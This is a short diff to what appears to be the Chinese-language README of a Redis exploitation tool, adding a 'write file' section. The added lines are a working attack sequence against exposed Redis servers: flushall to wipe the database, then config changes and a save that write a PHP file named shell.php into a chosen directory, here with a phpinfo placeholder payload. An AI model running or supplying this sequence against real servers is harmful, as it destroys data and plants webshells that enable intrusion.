@@ -58,6 +58,14 @@ RedisExp.exe gopher -f 1.txt
 
 ```
 
+写文件
+```
+flushall
+config set dir /tmp
+config set dbfilename shell.php
+set 'webshell' '<?php phpinfo();?>'
+save
+```
 
 
 1. 具体命令使用 -h 来查看
